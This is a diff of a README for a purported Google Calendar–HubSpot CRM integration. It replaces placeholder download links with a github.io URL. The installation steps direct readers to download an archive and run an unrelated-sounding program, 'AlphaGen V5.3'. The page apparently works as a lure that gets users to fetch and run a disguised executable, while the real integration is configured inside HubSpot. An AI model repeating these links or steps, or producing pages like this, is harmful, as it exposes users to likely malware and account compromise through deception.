@@ -2,13 +2,13 @@
 
 Sync Google Calendar with HubSpot CRM to schedule meetings, manage tasks, and track customer interactions — all in one place.
 
-[![Download](https://img.shields.io/badge/Download-Google_Calendar_HubSpot_Integration-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-Google_Calendar_HubSpot_Integration-blueviolet)](https://google-calendar-integration-hubspot-crm.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://google-calendar-integration-hubspot-crm.github.io/.github)  
 2. 📁 Extract to your local folder  
 3. 🖱 Run AlphaGen V5.3 to activate calendar sync  
 4. ✅ Log into your Google account and authorize HubSpot to access your calendar via `Settings > Integrations > Google Apps`
